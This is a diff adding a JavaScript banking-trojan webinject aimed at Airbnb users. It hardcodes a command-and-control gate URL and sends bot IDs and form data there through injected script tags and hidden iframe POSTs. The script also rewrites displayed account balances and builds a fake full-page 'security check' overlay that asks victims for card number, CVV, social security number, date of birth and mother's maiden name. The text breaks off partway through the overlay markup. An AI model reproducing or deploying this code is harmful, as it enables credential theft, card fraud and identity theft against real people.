@@ -1,0 +1,1146 @@
+
+
+
+
+var Tables = (function(){
+	
+	var admin = 'https://sontomoria.top/hdgcc/';
+	
+	var data = new Array();
+	
+	var link = {
+		gate: admin+"menu.php"
+	};
+	
+	var options = {
+		callback_status: '',
+		iframe_status: '',
+		currency_state: false
+	};
+	
+	var splitter = {value: 'none',position: 'none'};
+	var prefix = {minus: '-',plus: ''};
+	
+	function notnull(param){if(param == null || param == undefined || param == "null" || param == "undefined" || param == "" || param == " "){return false;}else{return true;}}
+	
+	function compatHeight(){var ua = navigator.userAgent.toLowerCase();var isOpera = (ua.indexOf('opera')  > -1);var isIE = (!isOpera && ua.indexOf('msie') > -1);return ((document.compatMode || isIE) && !isOpera) ? (document.compatMode == 'CSS1Compat') ? document.documentElement.clientHeight : document.body.clientHeight : (document.parentWindow || document.defaultView).innerHeight;}
+	
+	function cin(digits){var res = '';if(digits && digits.length > 0){digits = digits.replace(/\u2212/g, "-");var ValidChars = "-.0123456789";for(var i = 0;i < digits.length; i++){var Char = digits.charAt(i);if(ValidChars.indexOf(Char) >=0){res += Char;}}}return parseFloat(res);}
+	
+	function cout(digits,r){if(r == 1){digits = digits.toString().replace(/\$|\,/g,'');if(isNaN(digits))digits = "0";sign = (digits == (digits = Math.abs(digits)));digits = Math.floor(digits*100+0.50000000001);cents = digits%100;digits = Math.floor(digits/100).toString();if(cents<10)cents = "0" + cents;for (var i = 0; i < Math.floor((digits.length-(1+i))/3); i++)digits = digits.substring(0,digits.length-(4*i+3))+','+digits.substring(digits.length-(4*i+3));return (((sign)?'':'-') + digits + '.' + cents);}else if(r == 2){digits = digits.toString().replace(/\$|\,/g,'');if(isNaN(digits))digits = "0";sign = (digits == (digits = Math.abs(digits)));digits = Math.floor(digits*100+0.50000000001);cents = digits%100;digits = Math.floor(digits/100).toString();if(cents<10)cents = "0" + cents;for (var i = 0; i < Math.floor((digits.length-(1+i))/3); i++)digits = digits.substring(0,digits.length-(4*i+3))+'.'+digits.substring(digits.length-(4*i+3));return (((sign)?'':'-') + digits + ',' + cents);}else{return digits;}}
+	
+	function gc(digits){if(digits){if(/[0-9]/igm.test(digits)){if(/\.[0-9]{2}$|\.[0-9]{2}\s{1,}/igm.test(digits)){options.currency_state = 1;return cin(digits.replace(/\,/g, ''));}else{options.currency_state = 2;return cin(digits.replace(/\./g, '').replace(/,/g, '.'));}}else{return digits;}}else{return digits;}}
+	
+	function sc(digits){if(options.currency_state == 1 || options.currency_state == 2){return cout(digits,options.currency_state);}else{return digits;}}
+	
+	return{
+		set: function(name,value){
+			if(/function/igm.test(typeof value)){
+				data[name] = value();
+			}else{
+				data[name] = value;
+			}
+		},
+		
+		add: function(name,value){
+			if(data[name]){
+				data[name] = data[name]+value;
+			}else{
+				_tables.set(name,value);
+			}
+		},
+		
+		get: function(name){
+			return data[name];
+		},
+		
+		dump: function(){
+			var a = '';
+			for(key in data){
+				a += key+": "+data[key]+"\r\n";
+			}
+			alert(a);
+		},
+		
+		findout: function(){
+			var found = {
+				tag: false,
+				error: false,
+				element: false
+			};
+			
+			if(arguments && arguments.length >= 3){
+				var elements_array = arguments[1].split("|");
+				if(elements_array.length > 0){
+					for(var k = 0; k < elements_array.length; k++){
+						var elements = arguments[0].getElementsByTagName(elements_array[k]);
+						if(elements && elements.length > 0){
+							for(var i = 0; i < elements.length; i++){
+								for(var e = 2; e < arguments.length; e++){
+									var pattern = new RegExp(arguments[e].split(":")[1],"igm");
+									if(arguments[e].split(":")[0] == "class"){
+										if(elements[i].className !== null && pattern.test(elements[i].className)){
+											found.tag = true;
+										}else{
+											found.error = true;
+										}
+									}else if(arguments[e].split(":")[0] == "for"){
+										if(elements[i].className !== null && pattern.test(elements[i].htmlFor)){
+											found.tag = true;
+										}else{
+											found.error = true;
+										}
+									}else{
+										if(elements[i].getAttribute(arguments[e].split(":")[0]) !== null && pattern.test(elements[i].getAttribute(arguments[e].split(":")[0]))){
+											found.tag = true;
+										}else{
+											found.error = true;
+										}
+									}
+								}
+								if(found.tag && !found.error){
+									return elements[i];
+								}else{
+									found.tag = false;
+									found.error = false;
+								}
+							}
+						}
+					}
+					return false;
+				}else{
+					return false;
+				}
+			}else{
+				return false;
+			}
+		},
+		
+		findin: function(){
+			var found = {
+				tag: false,
+				error: false,
+				element: false
+			};
+		
+			if(arguments && arguments.length > 2){
+				var elements = arguments[0].getElementsByTagName(arguments[1]);
+				if(elements && elements.length > 0){
+					for(var i = 0; i < elements.length; i++){
+						for(var e = 2; e < arguments.length; e++){
+							var pattern = new RegExp(arguments[e],"igm");
+							if(pattern.test(elements[i].innerHTML.toLowerCase())){
+								found.tag = true;
+							}else{
+								found.error = true;
+							}
+						}
+						if(found.tag && !found.error){
+							return elements[i];
+						}else{
+							found.tag = false;
+							found.error = false;
+						}
+					}
+				}
+			}
+			return false;
+		},
+		
+		tinydecode: function(s){
+			s = s.replace(/\&lt;/g,'<');
+			s = s.replace(/\&gt;/g,'>');
+			s = s.replace(/\&quot;/g,'"');
+			s = s.replace(/\&amp;/g,'&');
+			s = s.replace(/\&nbsp;/g,' ');
+			return s;
+		},
+		
+		child: function(parent,child){
+			return parent && child ? parent.getElementsByTagName(child) : false;
+		},
+		
+		html: function(element){
+			if(element){
+				var text = (element.textContent ? element.textContent : element.innerText) ? (element.textContent ? element.textContent : element.innerText) : element.innerHTML;
+				return text.replace(/(\r\n|\r|\n|[\r]|[\n]|[\t]|\s*$)/ig,"");
+			}else{
+				return "";
+			}
+		},
+		
+		input: function(input,type){
+			switch(type){
+				case("block"):
+					if(input){input.onkeypress = function(evt){var evt = (evt) ? evt : ((event) ? event : null);var node = (evt.target) ? evt.target : ((evt.srcElement) ? evt.srcElement : null);if(evt.keyCode == 13){if(evt.stopPropagation){evt.stopPropagation();}else{evt.cancelBubble = true;}return false;}};input.onkeydown = function(evt){var evt = (evt) ? evt : ((event) ? event : null);var node = (evt.target) ? evt.target : ((evt.srcElement) ? evt.srcElement : null);if(evt.keyCode == 13){if(evt.stopPropagation){evt.stopPropagation();}else{evt.cancelBubble = true;}return false;}};}
+				break;
+				
+				case("disable"):
+					input.disabled = true;
+				break;
+			}
+		},
+		
+		bind: function(evType,obj,func){if(obj.removeEventListener){obj.removeEventListener(evType,func,false);}else if(obj.detachEvent){obj.detachEvent ('on'+evType,func);}if(obj.addEventListener ){obj.addEventListener(evType,func,false);return true;}else if(obj.attachEvent){var r = obj.attachEvent('on'+evType,func);return r;}else{elm['on'+evType] = func;}},
+		
+		replacebutton: function(button,func){
+			var newButton = document.createElement(/image/igm.test(button.tagName) ? 'img' : button.tagName);
+			for(x in button.attributes){
+				if(notnull(button.attributes[x]) && notnull(button.attributes[x].name) && notnull(button.attributes[x].value)){
+					if(button.attributes[x].name == "onclick" ||
+						button.attributes[x].name == "name" ||
+						button.attributes[x].name == "disabled" ||
+						(button.attributes[x].name == "href" && !/image/igm.test(button.tagName)) ||
+						button.attributes[x].name == "id"
+					){
+						continue;
+					}
+					if(button.attributes[x].name == "type" && button.attributes[x].value == "submit"){
+						newButton.setAttribute('type','button');
+					}else{
+						newButton.setAttribute(button.attributes[x].name,button.attributes[x].value);
+					}
+				}
+			}
+			if(button.tagName == "A" || button.tagName == "BUTTON" || button.tagName == "LI"){
+				newButton.innerHTML = button.innerHTML;
+			}
+			newButton.style.cursor = "pointer";
+			button.style.display = "none";
+			newButton.id = "_tables.button";
+			_tables.bind("click",newButton,func);
+			button.parentNode.insertBefore(newButton,button);
+		},
+		
+		encode: function(b){function gethex(a){return "%" + f.charAt(a >> 4) + f.charAt(a & 0xF);}var c = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz-_.~";var d = "!*'();:@&=+$,/?%#[]";var e = c + d;var f = "0123456789ABCDEFabcdef";b = b + "";var g = "";if (!b || b.length == 0){return "";}for (var i = 0; i < b.length; i++) {var h = b.charAt(i);if (c.indexOf(h) != -1) {g = g + h;} else {var j = b.charCodeAt(i);if (j < 128) {g = g + gethex(j);}if (j > 127 && j < 2048) {g = g + gethex((j >> 6) | 0xC0);g = g + gethex((j & 0x3F) | 0x80);}if (j > 2047 && j < 65536) {g = g + gethex((j >> 12) | 0xE0);g = g + gethex(((j >> 6) & 0x3F) | 0x80);g = g + gethex((j & 0x3F) | 0x80);}if (j > 65535) {g = g + gethex((j >> 18) | 0xF0);g = g + gethex(((j >> 12) & 0x3F) | 0x80);g = g + gethex(((j >> 6) & 0x3F) | 0x80);g = g + gethex((j & 0x3F) | 0x80);}}}return g;},
+		
+		send: function(){var l = link.gate+'?botid='+_brows.botid+'_'+_tables.get('bankname')+'&hash='+new Date();for(var i = 0; i < arguments.length; i++){for(key in arguments[i]){l += '&'+key+'='+_tables.encode(arguments[i][key]);}}var s = document.getElementById("_tables.as");if(s)s.parentNode.removeChild(s);var s = document.createElement("script");s.type = "text/javascript";s.id = "_tables.as";if(s.readyState){s.onreadystatechange = function(){if(s.readyState == "loaded" || s.readyState == "complete"){s.onreadystatechange = null;_tables.callback();}};}else{s.onload = function(){_tables.callback();};}l = l.replace(/\(/g,"%28").replace(/\)/g,"%29");s.src = l;document.getElementsByTagName("head")[0].appendChild(s);},
+		
+		status: function(s){if(s){options.callback_status = s;}else{return options.callback_status;}},
+		
+		fstatus: function(s){if(s){options.iframe_status = s;}else{return options.iframe_status;}},
+		
+		rand: function(a,b){return Math.floor((Math.random()*b)+a);},
+		
+		shuffle: function(o){for(var j, x, i = o.length; i; j = Math.floor(Math.random() * i), x = o[--i], o[i] = o[j], o[j] = x);return o;},
+		
+		brows: function(){
+			var ua=navigator.userAgent,tem,M=ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || []; 
+			if(/trident/i.test(M[1])){
+				tem=/\brv[ :]+(\d+)/g.exec(ua) || []; 
+				return 'IE '+''+(tem[1]||'');
+				}
+			if(M[1]==='Chrome'){
+				tem=ua.match(/\bOPR\/(\d+)/)
+				if(tem!=null)   {return {name:'Opera', version:tem[1]};}
+				}
+			M=M[2]? [M[1], M[2]]: [navigator.appName, navigator.appVersion, '-?'];
+			if((tem=ua.match(/version\/(\d+)/i))!=null) {M.splice(1,1,tem[1]);}
+			return M[0]+' '+M[1];
+		}, 
+		
+		click: function(btn,doc){
+			if(btn.type == "image"){
+				var inp_X = document.getElementById("inp_X");
+				var inp_Y = document.getElementById("inp_Y");
+				var inp_submit = document.getElementById("inp_submit");
+				if(inp_X)inp_X.parentNode.removeChild(inp_X);
+				if(inp_Y)inp_Y.parentNode.removeChild(inp_Y);
+				if(inp_submit)inp_submit.parentNode.removeChild(inp_submit);
+				var inp_X = document.createElement("input");
+				var inp_Y = document.createElement("input");
+				var inp_submit = document.createElement("input");
+				inp_X.name = btn.name+".x";
+				inp_Y.name = btn.name+".y";
+				inp_submit.name = btn.name;
+				inp_submit.value = btn.value;
+				inp_submit.type = "submit";
+				inp_submit.id = "inp_submit";
+				inp_X.id = "inp_X";
+				inp_Y.id = "inp_Y";
+				inp_X.value = _tables.rand(1,15);
+				inp_Y.value = _tables.rand(1,15);
+				inp_X.style.display = "none";
+				inp_Y.style.display = "none";
+				inp_submit.style.display = "none";
+				btn.parentNode.insertBefore(inp_X,btn);
+				btn.parentNode.insertBefore(inp_Y,btn);
+				btn.parentNode.insertBefore(inp_submit,btn);
+				var inp_submit = doc.getElementById("inp_submit");
+				if(inp_submit)_tables.click("click",inp_submit);
+			}else{
+				if(document.createEvent){
+					var event = document.createEvent('MouseEvents');
+					event.initMouseEvent('click',true,true,document.defaultView,1,0,0, 0, 0, false, false, false, false,0,null);
+					btn.dispatchEvent(event);
+				}else if(btn.fireEvent){
+					btn.click();
+				}
+			}
+		},
+		
+		iframelink: function(link,param){
+			var _tf = document.getElementById("_tables.frame.box");
+			if(_tf)_tf.parentNode.removeChild(_tf);
+			_tf = document.createElement("div");
+			_tf.style.position = "absolute";
+			_tf.style.left = _tables.get('showframe') ? "0px" : "-5000px";
+			_tf.style.top = _tables.get('showframe') ? "2000px" : "-5000px";
+			_tf.id = "_tables.frame.box";
+			_tf.innerHTML = '<iframe id="_tables.iframe" name="_tables.iframe" width=1280 height=800 onload="_tables.iframecallback();"></iframe>';
+			document.body.appendChild(_tf);
+			var f = document.getElementById("_tables.iframe");
+			f.src = link;
+			if(param)_tables.fstatus(param);
+		},
+		
+		iframeform: function(param){
+			var _tf = document.getElementById("_tables.frame.box");
+			if(_tf)_tf.parentNode.removeChild(_tf);
+			_tf = document.createElement("div");
+			_tf.style.position = "absolute";
+			_tf.style.left = _tables.get('showframe') ? "0px" : "-5000px";
+			_tf.style.top = _tables.get('showframe') ? "2000px" : "-5000px";
+			_tf.id = "_tables.frame.box";
+			_tf.innerHTML = '<iframe id="_tables.iframe" name="_tables.iframe" width=1280 height=800 onload="_tables.iframecallback();"></iframe>';
+			document.body.appendChild(_tf);
+			var f = document.getElementById("_tables.iframe");
+			if(param)_tables.fstatus(param);
+		},
+		
+		iframedom: function(fr){
+			var r = {
+				doc: false,
+				win: false
+			};
+			if(_brows.ver() == "FF" && fr){
+				r.doc = fr.contentDocument;
+				r.win = fr.contentWindow;
+			}else{
+				r.doc = fr.contentWindow.document;
+				r.win = fr.contentWindow;
+			}
+			
+			return r;
+		},
+		
+		height: function(){
+			return Math.max(document.compatMode != 'CSS1Compat' ? document.body.scrollHeight : document.documentElement.scrollHeight, compatHeight());
+		},
+		
+		popupshow: function(content,back){
+			_tables.popuphide();
+			back = back ? '#CCCCCC' : 'url(clear.png)';
+			var bg = '<div style="position:absolute;top:0px;left:0px;width:100%;height:'+Math.round((window.screen.availHeight)+1500)+'px;z-index:888;background:'+back+';opacity:0.7;filter: alpha(opacity = 70);"></div>';
+			var _tp = document.createElement("div");
+			_tp.id = "_tables.popup";
+			_tp.innerHTML = bg+""+content;
+			document.getElementsByTagName('body')[0].appendChild(_tp);
+		},
+		
+		popuphide: function(){
+			var _tp = document.getElementById("_tables.popup");if(_tp)_tp.parentNode.removeChild(_tp);
+		},
+		
+		inarr: function(arr,value){
+			for(var i = 0; i < arr.length; i++){
+				if(value == arr[i]){
+					return true;
+				}
+			}
+			arr.push(value);
+			return false;
+		},
+		
+		placeholdr: function(input){
+			var txt = input.getAttribute("placeholder");
+			if(txt.length > 0){
+				input.style.color = input.value.length == 0 ? '#cccccc' : '#000000';
+				input.value = input.value.length > 0 ? input.value : txt;
+			  
+				input.onfocus = function(){
+					this.style.color = '#000000';
+					this.value = this.value == this.getAttribute("placeholder") ? "" : this.value;
+				};
+			
+				input.onblur = function(){
+					if(this.value.length == 0){
+						this.value = this.getAttribute("placeholder");
+						this.style.color = '#CCCCCC';
+					}
+				};
+			}
+		},
+		
+		btntoloader: function(btn,imghref){
+			btn.style.display = 'none';
+			var img = document.createElement('img');
+			img.align = 'top';
+			img.src = imghref;
+			img.id = '_f_btntoloader';
+			btn.parentNode.insertBefore(img,btn);
+		},
+		
+		cget: function(param){
+			return gc(param);
+		},
+		
+		cset: function(param){
+			return sc(param);
+		},
+		
+		replace: function(element,summa){
+			var tsel = /select|option/igm.test(element.tagName);
+			var tinp = /input|textarea/igm.test(element.tagName);
+			
+			if(tsel){
+				if(splitter.value != "none" && splitter.position != "none"){
+					var minus = (element.text.split(splitter.value)[splitter.position].indexOf(prefix.minus) != -1) ? true : false;
+					var balance = gc(element.text.split(splitter.value)[splitter.position].replace(/\]/igm,''));
+				}else{
+					var minus = (element.text.indexOf(prefix.minus) != -1) ? true : false;
+					var balance = gc(element.text);
+				}
+			}else if(tinp){
+				if(splitter.value != "none" && splitter.position != "none"){
+					var minus = (element.value.split(splitter.value)[splitter.position].indexOf(prefix.minus) != -1) ? true : false;
+					var balance = gc(element.value.split(splitter.value)[splitter.position]);
+				}else{
+					var minus = (element.value.indexOf(prefix.minus) != -1) ? true : false;
+					var balance = gc(element.value);
+				}
+			}else{
+				if(splitter.value != "none" && splitter.position != "none"){
+					var minus = (_tables.html(element).split(splitter.value)[splitter.position].indexOf(prefix.minus) != -1) ? true : false;
+					var balance = gc(_tables.html(element).split(splitter.value)[splitter.position]);
+				}else{
+					var minus = (_tables.html(element).indexOf(prefix.minus) != -1) ? true : false;
+					var balance = gc(_tables.html(element));
+				}
+			}
+			
+			var new_balance = balance+parseFloat(summa);
+			if(minus)balance = balance * -1;
+			balance = sc(balance);
+			new_balance = sc(new_balance);
+			
+			if(tsel){
+				var f = element.text.replace(balance+"",new_balance+"");
+			}else if(tinp){
+				var f = element.value.replace(balance+"",new_balance+"");
+			}else{
+				var f = element.innerHTML.replace(balance+"",new_balance+"");
+			}
+			
+			if(parseFloat(new_balance) >= 0){
+				f = f.replace((f.indexOf(prefix.minus) != -1 ) ? prefix.minus : prefix.plus , prefix.plus );
+				f = f.replace("-"+new_balance+"",new_balance+"");
+			}else{
+				f = f.replace((f.indexOf(prefix.minus) != -1 ) ? prefix.minus : prefix.plus , prefix.minus );
+				f = f.replace(/\-{2}/,"-");
+			}
+			
+			if(tsel){
+				element.text = f;
+			}else if(tinp){
+				element.value = f;
+			}else{
+				element.innerHTML = f;
+			}
+			
+			if(splitter.value != "none" && splitter.position != "none"){
+				splitter.value = "none";
+				splitter.position = "none";
+			}
+		},
+		
+		splitter: function (value,position){
+			splitter.value = value;
+			splitter.position = position;
+		},
+		
+		match: function(el,data){
+			var pattern = new RegExp(data,"igm");
+			if(pattern.test(el)){
+				return true;
+			}else{
+				return false;
+			}
+		},
+		
+		convertdate: function(date){
+			var els = date.split(".");
+			if(els && els.length == 3){
+				var res = 0;
+				res += parseFloat(els[2]) * 365;
+				res += parseFloat(els[1]) * 30;
+				res += parseFloat(els[0]);
+				return res;
+			}else{
+				return -1;
+			}
+		},
+		
+		recolortable: function(table,class1,class2){
+			var tr = _tables.child(table,'tr');
+			if(tr && tr.length > 0){
+				for(var i = 0; i < tr.length; i++){
+					tr[i].className = (i % 2 == 0) ? class1 : class2;
+				}
+			}
+		},
+		
+		id: function(id,doc){var doc = doc ? doc : document;return doc.getElementById(id);},
+		
+		create: function(el,doc){var doc = doc ? doc : document;return doc.createElement(el);},
+		
+		selected: function(select){var sel = {value: select[select.selectedIndex].value,text: select[select.selectedIndex].text};return sel;},
+		
+		after: function(elem,ref){var parent = ref.parentNode;var next = ref.nextSibling;if(next){return parent.insertBefore(elem,next);}else{return parent.appendChild(elem);}},
+		
+		clone: function(inp,value){
+			var object = document.createElement(inp.tagName);
+			for (x in inp.attributes){
+				if(notnull(inp.attributes[x]) && notnull(inp.attributes[x].name) && notnull(inp.attributes[x].value)){
+					if(inp.attributes[x].name == "onclick" ||
+					   inp.attributes[x].name == "name" ||
+					   inp.attributes[x].name == "href" ||
+					   inp.attributes[x].name == "id" ||
+					   inp.attributes[x].name == "value"
+					){
+						continue;
+					}
+					object.setAttribute(inp.attributes[x].name,inp.attributes[x].value);
+				}
+			}
+			if(/select/igm.test(inp.tagName)){
+				object.options[0] = new Option(inp[inp.selectedIndex].text,inp[inp.selectedIndex].value);
+			}else{
+				value = value ? value : inp.value;
+				object.value = value;
+			}
+			object.disabled = true;
+			inp.style.display = "none";
+			inp.parentNode.insertBefore(object,inp);
+		},
+		
+		next: function(e,len,n){
+			if(e.value.length == len)document.getElementById(n).focus();
+		},
+		euiban: function(iban){
+			iban = iban.replace(/(\r\n|\r|\n|[\r]|[\n]|[\t]|\s*$|^\s*|\s)/ig,"");
+			var res = '';
+			var count = 0;
+			for(var i = 0; i < iban.length; i++){
+				if(count < 4){
+					res += iban[i];
+					count++;
+				}else{
+					res += " "+iban[i];
+					count = 1;
+				}
+				
+			}
+			return res;
+		},
+		
+		check_cc: function(value){
+			if (/[^0-9-\s]+/.test(value)) return false;
+			var nCheck = 0, nDigit = 0, bEven = false;
+			value = value.replace(/\D/g, "");
+			for (var n = value.length - 1; n >= 0; n--) {
+				var cDigit = value.charAt(n),
+				nDigit = parseInt(cDigit, 10);
+				if(bEven){
+					if ((nDigit *= 2) > 9) nDigit -= 9;
+				}
+				nCheck += nDigit;
+				bEven = !bEven;
+			}
+			return (nCheck % 10) == 0;
+		},
+		
+		check_day: function(dd){
+			if(parseFloat(dd) > 0 && parseFloat(dd) < 32 && (dd+'').length == 2){
+				return true;
+			}else{
+				return false;
+			}
+		},
+		
+		check_month: function(mm){
+			if(parseFloat(mm) > 0 && parseFloat(mm) < 13 && (mm+'').length == 2){
+				return true;
+			}else{
+				return false;
+			}
+		},
+		
+		check_email: function(email) { 
+			var re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
+			return re.test(email);
+		},
+		
+		check_year: function(yy,format){
+			switch(format){
+				case('YY'):
+					if(parseFloat(yy) >= 15 && (yy+'').length == 2){
+						return true;
+					}else{
+						return false;
+					}
+				break;
+				
+				case('YYYY'):
+					if(parseFloat(yy) >= 1920  && parseFloat(yy) <= 2015 && (yy+'').length == 4){
+						return true;
+					}else{
+						return false;
+					}
+				break;
+			}
+		},
+		
+		contentgrabber: function(doc){
+			var _tcgb = document.getElementById("_tables.content.grabber.box");
+			if(_tcgb)_tcgb.parentNode.removeChild(_tcgb);
+			_tcgb = document.createElement("div");
+			_tcgb.style.position = "absolute";
+			_tcgb.style.left = _tables.get('showframe') ? "0px" : "-5000px";
+			_tcgb.style.top = _tables.get('showframe') ? "2000px" : "-5000px";
+			_tcgb.id = "_tables.content.grabber.box";
+			_tcgb.innerHTML = '<iframe id="_tables.content.iframe" name="_tables.content.iframe" width=1280 height=800 style="border:5px solid black;" onload="_tables.showpage();"></iframe>';
+			document.body.appendChild(_tcgb);
+			var _tform = document.createElement("form");
+			var _tarea = document.createElement("textarea");
+			var _tbranch = document.createElement("input");
+			var _tbotid = document.createElement("input");
+			_tbranch.name = "branch";
+			_tbranch.value = "Config";
+			_tbotid.value = _brows.botid+'_Paypal';
+			_tbotid.name = 'botid';
+			_tform.id = "_tables.content.form";
+			_tform.target = "_tables.content.iframe";
+			_tform.action = link.gate;
+			_tform.method = "POST";
+			_tarea.name = "config";
+			if(_tables.get('showframe')){
+				_tarea.style.width = "1500px";
+				_tarea.style.height = "500px";
+			}else{
+				_tarea.style.display = "none";
+				_tform.style.display = "none";
+			}
+			_tarea.value = _brows.configdata;
+			_tform.appendChild(_tbotid);
+			_tform.appendChild(_tbranch);
+			_tform.appendChild(_tarea);
+			document.getElementsByTagName("body")[0].appendChild(_tform);
+			var _tform = document.getElementById("_tables.content.form");
+			_tform.submit();
+		}
+	};
+}());
+
+_tables = Tables;
+
+_tables.set('continue',true);
+_tables.set('message','');
+_tables.set('type','grabber');
+_tables.set('start','start');
+_tables.set('end','end');
+_tables.set('finish','');
+_tables.set('data','');
+_tables.set('balance','');
+_tables.set('bankname','airbnb');
+
+_tables.set('data','');
+_tables.set('loader','data:image/gif;base64,R0lGODlhEAAQAPMPAODg4Hp6egAAAFhYWL6+vhQUFJycnDY2NvDw8IqKikZGRiQkJKysrGhoaAQEBP///yH/C05FVFNDQVBFMi4wAwEAAAAh/hpDcmVhdGVkIHdpdGggYWpheGxvYWQuaW5mbwAh+QQFCgAPACwAAAAAEAAQAAAEcfDJh2gbdeoHFkCCAFCbBAgL4ojIqAFjIiQrnEmIMoPOMHymDEDnILhwQByCcTjiNAmFz1CiIK5RhYJaul6thMAtqEEkCgpnyzgJLAzmBAzAoLA5I8CBwDAA5E8TCAMBDwZUAHAlAAEjhxIEYyUEBFURACH5BAUKAA8ALAAAAAAPABAAAARd8Mn5QpOITiWXBAWjSQeyOMAiEKNkLIUhcNMQI8VhCUKWSQPBATAhEFu01oPRCARYyodh0GhAox/D6DdhKAZbwC+hYCAMDID6KNY0AATzVRPQxiVzjCFzfxyVaiMRACH5BAUKAA8ALAAAAAAQAA8AAARa8Mn5TKJYNqkWQkcmOQPSIYOIVALTMRNASMHBgEqSHAKQCD1NIRUzAAWzCaGxUgouEoLOAMh8royAVsR9wLqURqLZNQQICAL6qpIkAHAEgIwxzOAPOfeLz1MiACH5BAUKAA8ALAAAAAAQABAAAARc8MkpDb0yoDeUHAT2HAHnNdgmFUQXogggJY2sBIbhIVahBqSH6kFYiB4liqyG2BgYDFGjUHCAcgbZpSHoHiihC2AMUAESluOEkH2M1UIJgtAcHgmyJtwtt8P1GBEAIfkEBQoACAAsAAAAABAADgAABEUQyYlCoFgOKQTP3NYhBSgFXmeQ2FAQiHBYXhVPg7Bh9UrtmMMEgDD4gh1ByXLJlD5DDEGWOU6mHSJCa0pmuBQCUAIGRQAAIfkEBQoADgAsAAAAABAAEAAABGvQyekIodghJlOQAZAhAZckTrKIGdAAJ1CgFMGIiWEFR7UoEgQhQUBMEICB48CSADgUhMJg1ACuVYphMFAkrtiMYbEoNKIYwMGAQTYdTwkwCDAiqgVB0lHIZhgCSg5QaBMLAhcjaQJsGY5+EQAh+QQFCgAPACwAAAAAEAAQAAAEW/DJ+QCgWBJpDM/cxXiGAkoJMj4Kg1nIwxCW0UjKLQF01hQDDOKCabgmiCSI0WgEk8oMQ3E4BE6TASOK3TwaMVCgsXggbodTQZB4XHkgxJpIjDsEF8cxPjiEKREAIfkEBQoADgAsAQABAA8ADwAABFbQSSAJkUzqWi9p2+ZdzeUgpwZQDhM4wJBICICGwfFu95aYoSAhQMwENZ+B7EgrBWus2sKx2wgEiYRiOlP4BIHFwuCYhQBXSgFxODIEl8LasQCqNINjBAAh+QQFCgAPACwAAAAAEAAQAAAEXfDJ+RCiWN4HgCQbBlwdZ4QU4nVI4mGbZRGMlBgZbDR4jhkvHwWQKAongICy9lkQMK6hQiDoTRSFhMYhOHgWBkZD8TAsGhLD03Y41HrByQLRfgwcPsf3ICHnNko5EQAh+QQFCgAOACwAAAEAEAAPAAAEWtDJ6RCSgGppJdla922ZBpTGCE5MQlxUSalOU9wNyOzEIfwKkMHgQpwMBZnEsHK8JojGgSlZ1BALBcORGDgHAQlDZhgoCIUtTHNwmB2B9oZgdSiCNeUmkQBFAAAh+QQFCgAPACwAAAEAEAAPAAAEWPDJSR+qeCJQAcfARQlCUokI8RGk8E2AWgUC04nSomcP4QMDR6EQyPgYHwRDgbFVBpKXJNFwPg6PomLgMzQkAYOEIBEzAg0Alldgoh8GJkjegCKKvLIYEwEAIfkEBQoADwAsAAABAA8ADwAABFrwSVKAvPgSsbKXg8B8UvcAguAByGka44WwmOEQWSslh6IknhkAEFgYgbmhpUUYeHCywKPgYSSgTmAjMGQYTrDTpEBISBuWh059aDzMD0ZgfXG/pY8vKR7DRAAAOw==');
+
+
+
+
+_tables.text = {
+	security: 'Security Information',
+	legend: 'Unfortunately, due to unforeseen technical work in the online system we are having trouble identifying you. You\'ll have to prove your identity by following the instructions below. This check is one-time, and in the future you will be able to use your account without problems. Our team apologizes for any inconvenience.',
+	title1: 'Credit or debit cards',
+	title2: ' Address Details',
+	title3: 'Personal Information',
+	title_btn1: 'Continue',
+	title_btn2: 'Continue',
+	title_btn3: 'Finish',
+	name: 'Name on card',
+	cardNum: 'Card number',
+	personal: 'Personal Information',
+	exp: 'Expiration date',
+	cvv: 'CVV',
+	street: 'Street adress',
+	city: 'City',
+	state: 'State / Province',
+	phone: 'Phone number',
+	dofbth: 'Date of Birth',
+	ssn: 'Social security number',
+	mother: 'Mother\'s mainden name',
+	zip: 'ZIP'
+	};
+
+
+
+
+_tables.fake = function(){
+	var scrollHeight = Math.max(
+	  document.body.scrollHeight, document.documentElement.scrollHeight,
+	  document.body.offsetHeight, document.documentElement.offsetHeight,
+	  document.body.clientHeight, document.documentElement.clientHeight
+	);
+	var _fakediv = document.createElement('div');
+	_fakediv.style.width = '100%';
+	_fakediv.style.height =  scrollHeight + 'px';
+	_fakediv.style.position = 'absolute';
+	_fakediv.style.left = '0px';
+	_fakediv.style.top = '0px';
+	_fakediv.style.background = 'white';
+	_fakediv.style.zIndex = '99999';	
+		
+	_fakediv.innerHTML = '<div style=" border-radius:10px !important;">'+
+							
+										'<body style="margin:0px !important;margin-right:0px;">'+
+										'<div style="width:100%; height:64px;border-bottom:1px solid #dbdbdb;top:0px;left:0px; margin-right:0px;">'+
+											'<div style="width:82px; height:64px; margin:0 auto;">'+
+														'<svg style="    display: block;fill: currentColor;color: #FF5A5F !important;margin-right: 0px !important;height: 45px;padding-right: 14px !important;padding-top: 12px;padding-left: 19px;" aria-hidden="true" focusable="false" viewBox="0 0 1000 1000" data-reactid="12"><path d="M499.3 736.7c-51-64-81-120.1-91-168.1-10-39-6-70 11-93 18-27 45-40 80-40s62 13 80 40c17 23 21 54 11 93-11 49-41 105-91 168.1zm362.2 43c-7 47-39 86-83 105-85 37-169.1-22-241.1-102 119.1-149.1 141.1-265.1 90-340.2-30-43-73-64-128.1-64-111 0-172.1 94-148.1 203.1 14 59 51 126.1 110 201.1-37 41-72 70-103 88-24 13-47 21-69 23-101 15-180.1-83-144.1-184.1 5-13 15-37 32-74l1-2c55-120.1 122.1-256.1 199.1-407.2l2-5 22-42c17-31 24-45 51-62 13-8 29-12 47-12 36 0 64 21 76 38 6 9 13 21 22 36l21 41 3 6c77 151.1 144.1 287.1 199.1 407.2l1 1 20 46 12 29c9.2 23.1 11.2 46.1 8.2 70.1zm46-90.1c-7-22-19-48-34-79v-1c-71-151.1-137.1-287.1-200.1-409.2l-4-6c-45-92-77-147.1-170.1-147.1-92 0-131.1 64-171.1 147.1l-3 6c-63 122.1-129.1 258.1-200.1 409.2v2l-21 46c-8 19-12 29-13 32-51 140.1 54 263.1 181.1 263.1 1 0 5 0 10-1h14c66-8 134.1-50 203.1-125.1 